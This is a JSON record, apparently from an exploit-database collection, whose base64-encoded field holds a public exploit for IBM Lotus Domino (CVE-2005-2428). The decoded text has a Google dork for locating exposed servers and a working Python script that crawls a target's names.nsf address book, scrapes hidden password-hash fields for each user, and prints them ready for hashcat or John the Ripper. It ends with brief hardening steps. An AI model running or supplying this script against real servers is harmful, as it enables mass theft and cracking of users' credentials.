{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBJQk0gTG90dXMgRG9taW5vIDw9IFI4IFBhc3N3b3JkIEhhc2ggRXh0cmFjdGlvbiBFeHBsb2l0DQojIEdvb2dsZSBEb3JrOiBpbnVybDpuYW1lcy5uc2Y/b3BlbmRhdGFiYXNlDQojIERhdGU6IDAyLTI0LTIwMTYNCiMgRXhwbG9pdCBBdXRob3I6IEpvbmF0aGFuIEJyb2NoZQ0KIyBDb250YWN0OiBodHRwczovL3R3aXR0ZXIuY29tL2cwamhvbm55DQojIFZlbmRvciBIb21lcGFnZTogaHR0cHM6Ly93d3ctMDEuaWJtLmNvbS9zb2Z0d2FyZS9sb3R1cy9jYXRlZ29yeS9tZXNzYWdpbmcvDQojIFRlc3RlZCBvbjogTG90dXMgRG9taW5vIDguNQ0KIyBDVkUgOiBDVkUtMjAwNS0yNDI4DQoNCjEuIERlc2NyaXB0aW9uDQoNCklCTSBEb21pbm8gRGF0YWJhc2VzIGNvbnRhaW4gYSBjb25maWd1cmF0aW9uIGlzc3VlIGFsbG93aW5nIHVzZXJzIHRvIG9idGFpbiBwYXNzd29yZCBoYXNoZXMsIGNvbmZpZ3VyYWl0b24gaW5mb3JtYXRpb24gYW5kIG1vcmUgZnJvbSB0aGUgUHVibGljIEFkZHJlc3MgQm9vayAoaS5lLiwgbmFtZXMubnNmIGRhdGFiYXNlKS4gUGFzc3dvcmQgaGFzaGVzIGFyZSBvYnRhaW5lZCBmcm9tIHRoZSBoaWRkZW4gSFRNTCBIVFRQUGFzc3dvcmQgYW5kIGRzcEhUVFBQYXNzd29yZCBmaWVsZHMgcGVyIHVzZXIgaW4gdGhlIGRhdGFiYXNlLg0KDQoyLiBQcm9vZiBvZiBDb25jZXB0DQoNCiMhL3Vzci9iaW4vZW52IHB5dGhvbjINCg0KaW1wb3J0IHJlcXVlc3RzLCByZSwgQmVhdXRpZnVsU291cCwgc3lzLCBhcmdwYXJzZSwgb3MNCnJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpDQoNCg0KcGFyc2VyID0gYXJncGFyc2UuQXJndW1lbnRQYXJzZXIoZGVzY3JpcHRpb249J0RvbWlubyBFZmZlY3QgLSBBIExvdHVzIERvbWlubyBwYXNzd29yZCBoYXNoIHRvb2wgYnkgSm9uYXRoYW4gQnJvY2hlIChAZzBqaG9ubnkpJywgdmVyc2lvbj0iMS4wIikNCnBhcnNlci5hZGRfYXJndW1lbnQoJ3N5c3RlbScsIGhlbHA9IklQIGFkZHJlc3Mgb3IgaG9zdG5hbWUgdG8gaGFydmVzdCBoYXNoZXMgZnJvbS4gIikNCnBhcnNlci5hZGRfYXJndW1lbnQoJy11JywgJy0tdXJpJywgbWV0YXZhcj0ncGF0aCcsIGRlZmF1bHQ9Ii9uYW1lcy5uc2YiLCBoZWxwPSJQYXRoIHRvIHRoZSBuYW1lcy5uc2YgZmlsZS4gW0RlZmF1bHQ6IC9uYW1lcy5uc2ZdIikNCm91dGdyb3VwID0gcGFyc2VyLmFkZF9hcmd1bWVudF9ncm91cCh0aXRsZT0iT3V0cHV0IE9wdGlvbnMiKQ0Kb3V0Z3JvdXAuYWRkX2FyZ3VtZW50KCctLWhhc2hjYXQnLCBhY3Rpb249J3N0b3JlX3RydWUnLCAgaGVscD0iUHJpbnQgcmVzdWx0cyBmb3IgdXNlIHdpdGggaGFzaGNhdC4iKQ0Kb3V0Z3JvdXAuYWRkX2FyZ3VtZW50KCctLWpvaG4nLCBhY3Rpb249J3N0b3JlX3RydWUnLCBoZWxwPSJQcmludCByZXN1bHRzIGZvciB1c2Ugd2l0aCBKb2huIHRoZSBSaXBwZXIuIikNCg0KaWYgbGVuKHN5cy5hcmd2KSA9PSAxOg0KICAgIHBhcnNlci5wcmludF9oZWxwKCkNCiAgICBzeXMuZXhpdCgxKQ0KDQphcmdzID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KcHJpbnQgIlxuRG9taW5vIEVmZmVjdCB7fVxuIi5mb3JtYXQocGFyc2VyLnZlcnNpb24pDQoNCmhlYWRlcnM9eydVc2VyLUFnZW50JzonTW96aWxsYS81LjAgKFgxMTsgVTsgTGludXggaTY4NjsgZW4tVVMpIEFwcGxlV2ViS2l0LzUzNC4zIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzYuMC40NzIuNjMgU2FmYXJpLzUzNC4zJ30NCg0KDQp0cnk6DQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8ve317fS9QZW9wbGU/T3BlblZpZXciLmZvcm1hdChhcmdzLnN5c3RlbSwgYXJncy51cmkpLCB2ZXJpZnk9RmFsc2UsIGhlYWRlcnM9aGVhZGVycywgdGltZW91dD0zKQ0KZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuVGltZW91dCBhcyBlOg0KICAgIHByaW50ICJbIV0gVGltZWQgb3V0LCB0cnkgYWdhaW4uIg0KICAgIHN5cy5leGl0KDEpDQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50IGUNCg0Kc291cCA9IEJlYXV0aWZ1bFNvdXAuQmVhdXRpZnVsU291cChyZXNwb25zZS50ZXh0KQ0KDQpsaW5rcyA9IFtdDQoNCiNncmFiIGFsbCB1c2VyIHByb2ZpbGUgbGlua3MNCmZvciBsaW5rIGluIHNvdXAuZmluZEFsbCgnYScpOg0KICAgIGlmICJPcGVuRG9jdW1lbnQiIGluIGxpbmtbJ2hyZWYnXToNCiAgICAgICAgaWYgbGlua1snaHJlZiddIG5vdCBpbiBsaW5rczoNCgkgICAgICAgIGxpbmtzLmFwcGVuZChsaW5rWydocmVmJ10pDQoNCmhhc2hlcyA9IHt9DQpmb3IgbGluayBpbiBsaW5rczogI2dldCB1c2VyIHByb2ZpbGUNCiAgICB0cnk6DQogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL3t9e30iLmZvcm1hdChhcmdzLnN5c3RlbSwgbGluayksIHZlcmlmeT1GYWxzZSwgaGVhZGVycz1oZWFkZXJzLCB0aW1lb3V0PTIpDQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuVGltZW91dCBhcyBlOg0KICAgICAgICBwYXNzDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwcmludCBlDQoNCiAgICBpZiByZXNwb25zZS50ZXh0Og0KICAgICAgICBzb3VwID0gQmVhdXRpZnVsU291cC5CZWF1dGlmdWxTb3VwKHJlc3BvbnNlLnRleHQpDQoNCiAgICAgICAgbmFtZSA9IHNvdXAuZmluZCgnaW5wdXQnLCB7J25hbWUnIDogJyRkc3BTaG9ydE5hbWUnfSkuZ2V0KCd2YWx1ZScpLnN0cmlwKCkgI3Nob3J0IG5hbWUNCiAgICAgICAgaHR0cHBhc3N3b3JkID0gc291cC5maW5kKCdpbnB1dCcsIHsgIm5hbWUiIDogIkhUVFBQYXNzd29yZCJ9KS5nZXQoJ3ZhbHVlJykuc3RyaXAoKQ0KICAgICAgICBkc3BodHRwcGFzc3dvcmQgPSBzb3VwLmZpbmQoJ2lucHV0JywgeyAibmFtZSIgOiAiZHNwSFRUUFBhc3N3b3JkIn0pLmdldCgndmFsdWUnKS5zdHJpcCgpDQogICAgICAgIA0KICAgICAgICBpZiBodHRwcGFzc3dvcmQgYW5kIGh0dHBwYXNzd29yZCBub3QgaW4gaGFzaGVzLmtleXMoKToNCiAgICAgICAgICAgIGhhc2hlc1todHRwcGFzc3dvcmRdID0gbmFtZQ0KICAgICAgICBlbGlmIGRzcGh0dHBwYXNzd29yZCBhbmQgZHNwaHR0cHBhc3N3b3JkIG5vdCBpbiBoYXNoZXMua2V5cygpOg0KICAgICAgICAgICAgaGFzaGVzW2RzcGh0dHBwYXNzd29yZF0gPSBuYW1lICAgICAgDQoNCmlmIGhhc2hlczogI291dHB1dA0KICAgIGlmIGFyZ3MuaGFzaGNhdCBvciBhcmdzLmpvaG46DQogICAgICAgIGlmIGFyZ3MuaGFzaGNhdDoNCiAgICAgICAgICAgIGZvciBoIGluIGhhc2hlcy5rZXlzKCk6DQogICAgICAgICAgICAgICAgcHJpbnQgaA0KICAgICAgICBpZiBhcmdzLmpvaG46DQogICAgICAgICAgICBmb3IgaCwgbiBpbiBoYXNoZXMuaXRlbXMoKToNCiAgICAgICAgICAgICAgICBwcmludCAie306e30iLmZvcm1hdChuLGgpDQogICAgZWxzZToNCiAgICAgICAgZm9yIGgsIG4gaW4gaGFzaGVzLml0ZW1zKCk6DQogICAgICAgICAgICBwcmludCAiWypdIFVzZXI6IHt9IEhhc2g6IHt9Ii5mb3JtYXQobiwgaCkNCg0KDQpwcmludCAiXG57fSBoYXNoZXMgb2J0YWluZWRcbiIuZm9ybWF0KGxlbihoYXNoZXMpKQ0KDQozLiBTb2x1dGlvbg0KDQpUbyBoaWRlIHRoZSBIVFRQIHBhc3N3b3JkIGZyb20gdGhlIEhUTUwgc291cmNlOiANCg0KMSkgT3BlbiB0aGUgJFBlcnNvbmFsSW5oZXJpdGFibGVTY2hlbWEgc3ViZm9ybSAoSW4gdGhlIGRlc2lnbmVyIHVuZGVyIFNoYXJlZCBDb2RlLCBTdWJmb3JtcykuDQoyKSBGaW5kIHRoZSBmaWVsZHM6ICRkc3BIVFRQUGFzc3dvcmQgYW5kIEhUVFBQYXNzd29yZC4NCjMpIEluIHRoZSBmaWVsZCBwcm9wZXJ0aWVzIGZvciBib3RoIGZpZWxkcywgb24gdGhlIGhpZGUgdGFiIHVuZGVyICJIaWRlIHBhcmFncmFtIGZyb20iIGNoZWNrIG9mZiAiV2ViIGJyb3dzZXJzIi4NCjQpIE9wZW4gdGhlIFBlcnNvbiBmb3JtIChVbmRlciBGb3JtcykuDQo1KSBJbiB0aGUgZm9ybSBwcm9wZXJ0aWVzLCBvbiB0aGUgMm5kIHRhYiwgZGlzYWJsZSB0aGUgb3B0aW9uICJHZW5lcmF0ZSBIVE1MIGZvciBhbGwgZmllbGRzIi4NCg0KSW4gYWRkaXRpb24sIGVuc3VyZSBwcm9wZXIgZmlyZXdhbGxzIGFyZSBpbiBwbGFjZSB3aXRoaW4geW91ciBlbnZpcm9ubWVudCB0byBwcmV2ZW50IHB1YmxpYyBleHBvc3VyZSBvZiB0aGUgbmFtZXMubnNmIGRhdGFiYXNlIGFuZCBvdGhlciBzZW5zdGl2ZSBmaWxlcy4=", 
    "filename": "platforms/windows/webapps/39495.py", 
    "id": "39495", 
    "cves": [
        "CVE-2005-2428"
    ]
}